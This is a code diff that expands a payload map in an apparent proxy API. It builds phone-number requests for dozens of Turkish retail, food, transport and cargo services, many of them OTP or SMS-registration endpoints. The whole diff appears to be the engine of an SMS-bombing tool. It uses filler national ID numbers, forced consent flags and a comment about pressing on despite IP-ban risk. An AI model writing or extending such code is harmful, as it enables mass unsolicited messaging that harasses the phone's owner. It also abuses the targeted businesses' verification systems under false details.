@@ -66,60 +66,86 @@ const buildSmartPayload = (body: ProxyRequestBody): string => {
   const serviceId = body.serviceId || '';
 
   // --- GELİŞMİŞ PAYLOAD HARİTASI ---
-  const payloadMap: Record<string, any> = {
-    // === GİYİM & MODA ===
-    'lc_waikiki': { PhoneNumber: phoneRaw }, // LCW "PhoneNumber" ister
-    'defacto': { MobilePhone: phoneRaw, Email: email },
-    'mavi': { phone: phoneRaw, permission: true, kvkk: true },
-    'boyner': { gsm: phoneRaw }, 
-    'penti': { phone: phoneRaw, email: email },
-    'korayspor': { phone: phoneRaw },
-    'flo': { mobile: phoneRaw, sms_permission: 1 },
-    'in_street': { mobile: phoneRaw, sms_permission: 1 },
+  // api/proxy.ts -> buildSmartPayload fonksiyonu içindeki payloadMap:
 
-    // === MARKET & GIDA ===
-    'migros_money': { gsm: phoneRaw, moneyCard: "" },
-    'sok_market': { mobileNumber: phoneRaw },
-    'file_market': { mobilePhoneNumber: phone90 }, // File 90 ile başlar
-    'bim_market': { msisdn: phone90 }, // BIM 90 ister
-    'english_home': { Phone: phone05, Source: "WEB" }, // 05 ile ister
+  const payloadMap: Record<string, any> = {
+    // --- GİYİM & MODA (Zorlu) ---
+    'lc_waikiki': { PhoneNumber: phoneRaw }, // Sadece 5xxxxxxxxx
+    'defacto': { MobilePhone: phoneRaw, Email: email },
+    'koton': { email: email, mobile: phoneRaw, sms_permission: true, kvkk_permission: true },
+    'mavi': { phone: phoneRaw, permission: true, kvkk: true },
+    'boyner': { gsm: phoneRaw },
+    'penti': { phone: phoneRaw, email: email },
+    'flo': { mobile: phoneRaw, sms_permission: 1, kvkk_permission: 1 },
+    'in_street': { mobile: phoneRaw, sms_permission: 1 },
+    'korayspor': { phone: phoneRaw },
+    'network': { mobile: phoneRaw },
+    'altinyildiz': { phone: phoneRaw },
+
+    // --- MARKET & EV (Hassas) ---
+    'migros_money': { gsm: phoneRaw, moneyCard: "", isKvkkConfirmed: true },
+    'sok_market': { mobileNumber: phoneRaw, token: "" },
+    'file_market': { mobilePhoneNumber: phone90 }, // 905xxxxxxxxx
+    'bim_market': { msisdn: phone90 }, // 905xxxxxxxxx
+    'english_home': { Phone: phone05, Source: "WEB" }, // 05xxxxxxxxx
+    'evidea': { phone: phoneRaw, sms_allowed: "on", email: email },
+    'koctas': { phone: phoneRaw },
+    'wmf': { phone: phoneRaw, confirm: "true", email: email },
+    'madame_coco': { mobile: phoneRaw },
+    'tedi': { phone: phoneRaw },
+
+    // --- YEMEK & İÇECEK (Hızlı) ---
     'kahve_dunyasi': { countryCode: "90", phoneNumber: phoneRaw },
     'starbucks': { mobile: phoneRaw },
-    
-    // === YEMEK (Burger King Grubu) ===
-    // Tıkla Gelsin grubu genelde aynı altyapıyı kullanır
-    'burger_king': { phone: phoneRaw }, 
+    'burger_king': { phone: phoneRaw },
     'popeyes': { phone: phoneRaw },
     'arbys': { phone: phoneRaw },
     'usta_donerci': { phone: phoneRaw },
-    'tikla_gelsin': { operationName: "GENERATE_OTP", variables: { phone: phoneRaw }, query: "mutation GENERATE_OTP($phone: String!) { generateOtp(phone: $phone) { isSuccess message } }" }, // GraphQL Payload
+    'sbarro': { phone: phoneRaw },
+    'little_caesars': { SmsInform: true, NameSurname: "Misafir", Phone: phone05 },
+    'dominos': { Phone: phoneRaw, PhoneCountryCode: "90" },
+    'pasaport_pizza': { phone: phoneRaw },
+    'baydoner': { Name: "Misafir", Surname: "Kullanici", Gsm: phoneRaw, Kvkk: true },
+    'kofteci_yusuf': { FirmaId: 82, Telefon: phoneRaw },
+    'komagene': { FirmaId: 32, Telefon: phoneRaw },
+    'coffy': { countryCode: "90", isKVKKAgreementApproved: true, phoneNumber: phoneRaw },
+    
+    // --- ÖZEL: TIKLA GELSİN (GraphQL) ---
+    'tikla_gelsin': { 
+        operationName: "GENERATE_OTP", 
+        variables: { phone: phoneRaw, countryCode: "TR" }, 
+        query: "mutation GENERATE_OTP($phone: String!, $countryCode: String) { generateOtp(phone: $phone, countryCode: $countryCode) { isSuccess message } }" 
+    },
 
-    // === ULAŞIM & SEYAHAT ===
+    // --- ULAŞIM & KARGO (IP Ban Riski Yüksek ama Deniyoruz) ---
     'marti': { mobile_number: phoneRaw },
     'binbin': { phone: phoneRaw },
-    'kamil_koc': { Phone: phoneRaw, TcNumber: "11111111111" }, // TC isteyebilir
-    'pamukkale': { mobile: phoneRaw },
-    'metro_turizm': { phone: phoneRaw },
-    'ido': { phone: phoneRaw },
-
-    // === KARGO ===
+    'kamil_koc': { Phone: phoneRaw, TcNumber: "11111111111" },
+    'pamukkale': { mobile: phoneRaw, tc: "11111111111" },
+    'metro_turizm': { phone: phoneRaw, identity: "11111111111" },
     'yurtici_kargo': { phone: phoneRaw },
     'aras_kargo': { msisdn: phone90 },
     'mng_kargo': { tel: phoneRaw },
     'surat_kargo': { phone: phoneRaw },
+    'ido': { phone: phoneRaw },
 
-    // === DİĞERLERİ ===
-    'baydoner': { Name: "Misafir", Surname: "Kullanici", Gsm: phoneRaw },
-    'kofteci_yusuf': { FirmaId: 82, Telefon: phoneRaw }, // FirmaId kritik
-    'komagene': { FirmaId: 32, Telefon: phoneRaw },
-    'metro_market': { methodType: "2", mobilePhoneNumber: phoneRaw },
-    'wmf': { phone: phoneRaw, confirm: true },
-    'evidea': { phone: phoneRaw, sms_allowed: true },
+    // --- DİĞERLERİ ---
     'yapp': { phone_number: phoneRaw, device_name: "Android" },
-    'hayat_su': { mobilePhoneNumber: "0" + phoneRaw }, // 0 başında ister
+    'hayat_su': { mobilePhoneNumber: "0" + phoneRaw, deviceId: "web" },
+    'suiste': { action: "register", gsm: phoneRaw },
+    'porty': { job: "start_login", phone: phoneRaw },
+    'kim_gb_ister': { msisdn: phone90 },
+    '345_dijital': { phoneNumber: "+" + phone90, name: "User" },
+    'beefull': { phoneCode: "90", tenant: "beefull", phone: phoneRaw },
+    'naosstars': { telephone: "+" + phone90, type: "register" },
+    'akasya_avm': { phone: phoneRaw },
+    'dr_store': { mobile: phoneRaw },
+    'kitapyurdu': { mobile: phoneRaw },
+    'bkm_kitap': { phone: phoneRaw },
+    'cineverse': { mobile: phoneRaw },
     
-    // Varsayılan (Tutmassa bunu dener)
-    'default': { phone: phoneRaw, email: email, mobile: phoneRaw, gsm: phoneRaw }
+    // Default Fallback
+    'default': { phone: phoneRaw, email: email, mobile: phoneRaw }
   };
 
   const payload = payloadMap[serviceId] || payloadMap['default'];
